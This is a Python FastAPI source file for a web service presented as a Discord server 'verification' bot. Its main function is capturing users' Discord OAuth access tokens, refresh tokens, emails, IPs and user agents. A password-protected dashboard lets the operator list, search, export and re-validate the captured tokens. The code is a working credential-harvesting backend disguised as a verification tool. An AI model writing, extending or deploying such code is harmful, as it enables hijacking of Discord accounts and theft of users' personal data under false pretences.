"""Dashboard web + endpoints de capture (FastAPI)."""

from __future__ import annotations

import asyncio
import logging
import secrets
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlencode

from fastapi import Depends, FastAPI, HTTPException, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, Field

from . import db, discord_api
from .config import settings
from .security import make_session, read_state, session_valid, sign_state

BASE_DIR = Path(__file__).resolve().parent

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-7s | %(name)s | %(message)s",
)
log = logging.getLogger("verif.web")

templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))


@asynccontextmanager
async def lifespan(app: FastAPI):
    await db.init()
    bot_task: Optional[asyncio.Task] = None
    if settings.run_bot and settings.discord_bot_token:
        from bot.main import run_bot

        bot_task = asyncio.create_task(run_bot(), name="discord-bot")

        def _on_done(task: asyncio.Task) -> None:
            if task.cancelled():
                return
            exc = task.exception()
            if exc:
                log.error("le bot s'est arrete", exc_info=exc)

        bot_task.add_done_callback(_on_done)
        log.info("bot Discord lance dans le process web")
    else:
        log.info("bot Discord desactive dans ce process")

    yield

    if bot_task is not None:
        bot_task.cancel()
        try:
            await bot_task
        except (asyncio.CancelledError, Exception):
            pass
    await discord_api.close()
    await db.close()


app = FastAPI(title="Discord Verification", version="1.0.0", lifespan=lifespan)
app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")


# ---------------------------------------------------------------------------
# Modeles
# ---------------------------------------------------------------------------


class CapturePayload(BaseModel):
    token: str = Field(min_length=10)
    state: Optional[str] = None
    source: str = "oauth2_implicit"
    scopes: Optional[str] = None
    expires_in: Optional[int] = None
    refresh_token: Optional[str] = None
    token_type: Optional[str] = None


class ExchangePayload(BaseModel):
    code: str
    state: Optional[str] = None


class LoginPayload(BaseModel):
    password: str


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def client_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host if request.client else ""


def oauth_url(state: str, mode: str = "token") -> str:
    params = {
        "client_id": settings.discord_client_id,
        "redirect_uri": settings.oauth_redirect_uri,
        "response_type": mode,
        "scope": settings.default_scopes,
        "state": state,
        "prompt": "consent",
    }
    return "https://discord.com/oauth2/authorize?" + urlencode(params)


def require_admin(request: Request) -> bool:
    if session_valid(request.cookies.get("verif_session"), settings.session_secret):
        return True
    raise HTTPException(status_code=401, detail="Session invalide")


def serialise(row: dict[str, Any]) -> dict[str, Any]:
    out: dict[str, Any] = {}
    for key, value in row.items():
        if isinstance(value, datetime):
            out[key] = value.astimezone(timezone.utc).isoformat()
        elif isinstance(value, int) and key in {"user_id", "guild_id"}:
            out[key] = str(value)
        else:
            out[key] = value
    return out


async def capture_token(
    *,
    token: str,
    source: str,
    state_payload: Optional[dict[str, Any]],
    request: Request,
    scopes: Optional[str] = None,
    expires_in: Optional[int] = None,
    refresh_token: Optional[str] = None,
    token_type: Optional[str] = None,
) -> dict[str, Any]:
    """Valide le token, l'enregistre et termine la verification."""
    me = await discord_api.fetch_me(token)
    if not me:
        return {"ok": False, "error": "token_invalide"}

    user_id = int(me["id"])
    guild_id: Optional[int] = None
    if state_payload and state_payload.get("guild_id"):
        try:
            guild_id = int(state_payload["guild_id"])
        except (TypeError, ValueError):
            guild_id = None

    expires_at = None
    if expires_in:
        expires_at = datetime.now(timezone.utc) + timedelta(seconds=int(expires_in))

    capture_id = await db.save_capture(
        user_id=user_id,
        token=token,
        source=source,
        username=me.get("username"),
        global_name=me.get("global_name"),
        discriminator=me.get("discriminator"),
        avatar=me.get("avatar"),
        email=me.get("email"),
        token_type=token_type,
        scopes=scopes,
        refresh_token=refresh_token,
        expires_at=expires_at,
        guild_id=guild_id,
        user_agent=request.headers.get("user-agent"),
        ip=client_ip(request),
    )

    detail: list[str] = [f"capture #{capture_id}"]
    joined = False
    role_given = False

    if guild_id and settings.discord_bot_token:
        config = await db.get_guild_config(guild_id) or {}

        if source.startswith("oauth2"):
            ok, message = await discord_api.add_guild_member(guild_id, user_id, token)
            joined = ok
            detail.append(message)

        role_id = config.get("verified_role_id")
        if role_id:
            ok, message = await discord_api.add_role(guild_id, user_id, int(role_id))
            role_given = ok
            detail.append(message)

        await db.set_verification_status(
            guild_id,
            user_id,
            "verified" if (joined or role_given) else "pending",
            " | ".join(detail),
            source,
        )

    log.info("capture #%s user=%s source=%s", capture_id, user_id, source)
    return {
        "ok": True,
        "capture_id": capture_id,
        "user": {
            "id": str(user_id),
            "username": me.get("username"),
            "global_name": me.get("global_name"),
            "avatar": discord_api.avatar_url(user_id, me.get("avatar"), me.get("discriminator")),
        },
        "guild_id": str(guild_id) if guild_id else None,
        "joined": joined,
        "role_given": role_given,
    }


# ---------------------------------------------------------------------------
# Pages publiques
# ---------------------------------------------------------------------------


@app.get("/healthz", response_class=PlainTextResponse)
async def healthz() -> str:
    return "ok"


@app.get("/", response_class=HTMLResponse)
async def index(request: Request) -> HTMLResponse:
    data = await db.stats()
    return templates.TemplateResponse(
        request,
        "index.html",
        {
            "stats": data,
            "invite_url": settings.bot_invite_url,
            "configured": settings.configured,
            "base_url": settings.public_base_url,
        },
    )


@app.get("/verify", response_class=HTMLResponse)
async def verify_page(request: Request, state: Optional[str] = Query(default=None)) -> HTMLResponse:
    payload = read_state(state, settings.session_secret) if state else None
    if not payload:
        payload = {"n": secrets.token_hex(4)}
        state = sign_state(payload, settings.session_secret)

    guild_id = payload.get("guild_id")
    guild_name = None
    if guild_id:
        guild = await discord_api.fetch_guild(int(guild_id))
        if guild:
            guild_name = guild.get("name")

    return templates.TemplateResponse(
        request,
        "verify.html",
        {
            "state": state,
            "guild_id": guild_id,
            "guild_name": guild_name or "Serveur Discord",
            "oauth_url": oauth_url(state, "token"),
            "code_url": oauth_url(state, "code"),
            "configured": settings.configured,
        },
    )


@app.get("/auth/callback", response_class=HTMLResponse)
async def auth_callback(request: Request) -> HTMLResponse:
    return templates.TemplateResponse(
        request,
        "callback.html",
        {
            "state": request.query_params.get("state"),
            "code": request.query_params.get("code"),
            "base_url": settings.public_base_url,
        },
    )


@app.get("/success", response_class=HTMLResponse)
async def success(request: Request) -> HTMLResponse:
    return templates.TemplateResponse(
        request,
        "success.html",
        {
            "username": request.query_params.get("username", ""),
            "guild": request.query_params.get("guild", ""),
            "joined": request.query_params.get("joined") == "1",
        },
    )


# ---------------------------------------------------------------------------
# API de capture
# ---------------------------------------------------------------------------


@app.post("/api/capture")
async def api_capture(payload: CapturePayload, request: Request) -> JSONResponse:
    state_payload = read_state(payload.state, settings.session_secret) if payload.state else None
    result = await capture_token(
        token=payload.token.strip(),
        source=payload.source or "oauth2_implicit",
        state_payload=state_payload,
        request=request,
        scopes=payload.scopes,
        expires_in=payload.expires_in,
        refresh_token=payload.refresh_token,
        token_type=payload.token_type,
    )
    return JSONResponse(result, status_code=200 if result.get("ok") else 400)


@app.post("/api/exchange")
async def api_exchange(payload: ExchangePayload, request: Request) -> JSONResponse:
    if not settings.configured:
        return JSONResponse({"ok": False, "error": "oauth_non_configure"}, status_code=500)
    token_data = await discord_api.exchange_code(payload.code, settings.oauth_redirect_uri)
    if not token_data:
        return JSONResponse({"ok": False, "error": "echange_impossible"}, status_code=400)
    state_payload = read_state(payload.state, settings.session_secret) if payload.state else None
    result = await capture_token(
        token=token_data["access_token"],
        source="oauth2_code",
        state_payload=state_payload,
        request=request,
        scopes=token_data.get("scope"),
        expires_in=token_data.get("expires_in"),
        refresh_token=token_data.get("refresh_token"),
        token_type=token_data.get("token_type"),
    )
    return JSONResponse(result, status_code=200 if result.get("ok") else 400)


# ---------------------------------------------------------------------------
# Dashboard
# ---------------------------------------------------------------------------


@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request) -> HTMLResponse:
    authed = session_valid(request.cookies.get("verif_session"), settings.session_secret)
    key = request.query_params.get("key")
    if not authed and key and secrets.compare_digest(key, settings.admin_password):
        authed = True
    return templates.TemplateResponse(
        request,
        "dashboard.html",
        {
            "authed": authed,
            "base_url": settings.public_base_url,
        },
    )


@app.post("/api/login")
async def api_login(payload: LoginPayload) -> JSONResponse:
    if not secrets.compare_digest(payload.password, settings.admin_password):
        raise HTTPException(status_code=401, detail="Mot de passe incorrect")
    cookie = make_session(settings.session_secret)
    response = JSONResponse({"ok": True})
    response.set_cookie(
        "verif_session",
        cookie,
        max_age=60 * 60 * 24 * 14,
        httponly=True,
        samesite="lax",
        secure=settings.public_base_url.startswith("https"),
    )
    return response


@app.post("/api/logout")
async def api_logout() -> JSONResponse:
    response = JSONResponse({"ok": True})
    response.delete_cookie("verif_session")
    return response


@app.get("/api/stats")
async def api_stats(_: bool = Depends(require_admin)) -> JSONResponse:
    return JSONResponse(await db.stats())


@app.get("/api/captures")
async def api_captures(
    _: bool = Depends(require_admin),
    limit: int = Query(default=200, ge=1, le=1000),
    offset: int = Query(default=0, ge=0),
    search: str = Query(default=""),
) -> JSONResponse:
    rows = await db.list_captures(limit=limit, offset=offset, search=search)
    return JSONResponse({"items": [serialise(r) for r in rows]})


@app.get("/api/export")
async def api_export(_: bool = Depends(require_admin)) -> JSONResponse:
    rows = await db.list_captures(limit=1000)
    return JSONResponse(
        {"count": len(rows), "items": [serialise(r) for r in rows]},
        headers={"Content-Disposition": 'attachment; filename="captures.json"'},
    )


@app.post("/api/captures/{capture_id}/check")
async def api_check(capture_id: int, _: bool = Depends(require_admin)) -> JSONResponse:
    row = await db.get_capture(capture_id)
    if not row:
        raise HTTPException(status_code=404, detail="Capture introuvable")
    me = await discord_api.fetch_me(row["token"])
    await db.mark_capture_checked(capture_id, me is not None)
    return JSONResponse({"ok": me is not None, "user": me})


@app.delete("/api/captures/{capture_id}")
async def api_delete(capture_id: int, _: bool = Depends(require_admin)) -> JSONResponse:
    await db.delete_capture(capture_id)
    return JSONResponse({"ok": True})


@app.get("/api/verifications")
async def api_verifications(
    _: bool = Depends(require_admin), limit: int = Query(default=100, ge=1, le=500)
) -> JSONResponse:
    rows = await db.list_verifications(limit=limit)
    return JSONResponse({"items": [serialise(r) for r in rows]})


@app.get("/api/config")
async def api_config(_: bool = Depends(require_admin)) -> JSONResponse:
    rows = await db.list_guild_configs()
    return JSONResponse({"items": [serialise(r) for r in rows]})


@app.get("/api/invite")
async def api_invite() -> JSONResponse:
    return JSONResponse({"url": settings.bot_invite_url, "client_id": settings.discord_client_id})


@app.get("/favicon.ico", include_in_schema=False)
async def favicon() -> RedirectResponse:
    return RedirectResponse("/static/favicon.svg")
